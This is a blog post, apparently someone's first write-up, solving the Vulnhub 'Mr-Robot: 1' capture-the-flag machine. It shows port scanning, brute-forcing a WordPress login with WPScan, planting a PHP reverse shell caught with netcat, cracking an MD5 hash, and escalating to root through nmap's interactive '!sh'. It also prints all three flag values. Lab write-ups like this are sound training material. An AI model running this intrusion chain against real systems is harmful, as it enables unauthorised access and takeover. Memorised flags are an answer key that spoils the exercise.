---
layout: post
title: Mr. Robot Vulnhub CTF
---

Mr-Robot: 1 is a CTF vulnerable machine hosted on Vulnhub developed by [Jason](https://www.vulnhub.com/author/jason,292/)
The image can be downloaded [here.](https://www.vulnhub.com/#modal151download)

After firing up this machine I found the I.P. it pulled and started my investigation. I found the I.P. with an app for iOS devices called Fing but there are tons of other ways to do this.

After locating the machine I ran an Nmap scan to see which ports were open and got the following

```
$ nmap -T5 192.168.1.168

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-30 17:42 EDT
Nmap scan report for 192.168.1.168
Host is up (0.0015s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 15.96 seconds
```


Goodie it looks like we have a webserver. After browsing to the site you will find a very nicely done webpage devoted
to Mr.Robot, or as some may know him Elliot, that you can devulge a lot of time into but thats not where we want to focus. The first thing you should do when looking at a website
is always look at the robots.txt file and see what you're not supposed to see. If you do that on this machine you are given a webpage that has two
pages, both of which we are going to visit.

First lets take a look at fsocity.dic, judging from the name this is probably a dictionary file so lets go ahead and save this file for later use(?)

```
wget 192.168.1.168/fsocity.dic
```


Note: Your I.P. will probably be different.

After that lets look at the much more promising page key-1-of-3.txt. Which believe it or not is the first of 3 keys we need to find. Browsing to that location
we get **073403c8a58a1f80d943455fb30724b9**. Now that we have our first key where do we go from here?

Next I decided to fire up DirBuster to take a look around and see what other directories there were and maybe to see if we could figure out what this site was running on.

After firing up DirBuster I was able to figure out this was a Wordpress install and that there was a login page located at /wp-login.php.
The great/horrible thing about Wordpress is that it tells you when you have a correct username and when you entered a username that does
not exist. So after trying the default user and admin (both of which do not exist) I got creative and tried MrRobot which also did not work
but I remembered that the main characters name was elliot so why not give that a go, and what do you know that is a user in the database.
At this point i fired up WPScan and attempted to brute force the user elliot with the dictionary given earlier.

```
$ ruby wpscan.rb -u 192.168.1.168 --threads 20 --wordlist ~/Documents/Projects/CTF/CTF_Events/Mr-Robot-1/fsocity.dic --username elliot
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.1
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.1.168/
[+] Started: Sat Jul  2 00:53:46 2016

[+] robots.txt available under: 'http://192.168.1.168/robots.txt'
[!] The WordPress 'http://192.168.1.168/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: http://192.168.1.168/xmlrpc.php

[+] WordPress version 4.3.5 (Released on 2016-06-21) identified from rss generator, rdf generator, atom generator, links opml

[+] Enumerating plugins from passive detection ...
[+] No plugins found
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652

  Brute Forcing 'elliot' Time: 08:28:20 <============== > (858145 / 858161) 99.99%  ETA: 00:00:01
  +----+--------+------+-----------+
  | Id | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+

[+] Finished: Sat Jul  2 09:22:07 2016
[+] Requests Done: 858195
[+] Memory used: 14.832 MB
[+] Elapsed time: 08:28:21
```


I ended with these results. I let it run over night or else you probably could have upped the threads to get this done faster.

First glance it looks like elliot is most likely an admin of this blog which is great news for us. After browsing to appearance and
themes I decided to edit the archive.php page in hopes of adding a reverse php shell.
After going to this [page](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and
grabbing the php reverse shell hosted there I opened up the nc listener like the post says too and went to the archive page.

After doing this a reverse shell opened up in my terminal

```
$ nc -v -n -l -p 1234
Connection from 192.168.1.168:42897
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC
2015 x86_64 x86_64 x86_64 GNU/Linux
 14:41:38 up  9:54,  0 users,  load average: 1.00, 1.01, 1.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$
```


After getting this shell I decided to checkout the home folder. After arriving here I saw the key-2-of-2.txt file and got very excited! However,
after trying to cat it I realized I did not have permission to read it. I did notice there was a md5 password file for user robot (whos
home directory we were in). After catting this file I decided to go to [MD5cracker](http://www.md5cracker.org) and have them crack it. Luckily this
only took seconds and I got the password of

```
abcdefghijklmnopqrstuvwxyz
```
So at this point I tried to su robot and kept getting a not in terminal error. I figured this had something to do with TTY so I did a quick
google search that led me to another article on pentestmonkey with a python command to open up a terminal. Below is going to be the log of
everything I did to get key to after gaining access to the machine besides the cracking of the md5 hash since that was not done in the terminal


```
$ nc -lvnp 1234
Connection from 192.168.1.168:42903
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
14:57:45 up 10:10,  0 users,  load average: 1.10, 1.06, 1.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ cd /home/robot
cd /home/robot
robot@linux:~$ ls
ls
key-2-of-3.txtpassword.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$
```


After searching around the box a bit and looking at the SUID binaries I remembered an old flaw with Nmap that allowed a user to execute commands as
root in interactive mode. After launching the interactive mode you can enter !sh to gain a shell. At this point I navigated to the root directory
catted the key-3-of-3.txt file and got the final key. Below will be a log of everything I did after getting the second key.

```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# cd /root/
cd /root/
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
#
```


That just about wraps up this Vulnhub image. Hopefully everyone enjoys my first writeup for Vulnhub. I am still fairly new at CTFs and boot2root
machines but I plan on doing a lot more of these and to continue writing writeups! If anyone has any suggestions on
what they would like done differently for these writeups please let me know. Thanks everyone for reading and if your interested in some security
content check out my twitter or the rest of my blog.
